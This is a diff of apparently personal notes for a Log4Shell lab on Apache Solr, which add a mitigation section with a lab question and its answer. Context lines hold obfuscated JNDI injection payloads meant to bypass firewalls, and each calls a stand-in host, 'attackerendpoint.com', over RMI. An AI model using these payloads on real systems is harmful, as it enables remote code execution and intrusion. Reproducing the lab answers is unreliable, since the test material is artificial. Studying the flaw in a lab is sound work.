@@ -111,7 +111,7 @@ exit from the netcat
 **ssh solor@mahcineip**
 # Detection
 we alredy know the task 3 solr.log path var/solr/logs
-cat ~/var/solar/logs~
+cat `/var/solar/logs`
 We can checks that our code is executed
 # Bypasses
 **EVEN NOW FIREWALL MAKE STOPS THE JDIN LDAP OR SUCH THING**
@@ -126,4 +126,8 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendp
 ${${::-j}ndi:rmi://attackerendpoint.com/}
 ```
 # Mitigation
-
+## TO PREVENT 
+`solr.in.sh` its contain `apache server` config files
+`locate solr.in.sh`
+1.What is the full path of the specific solr.in.sh file?
+Answer:`/etc/default/solr.in.sh`
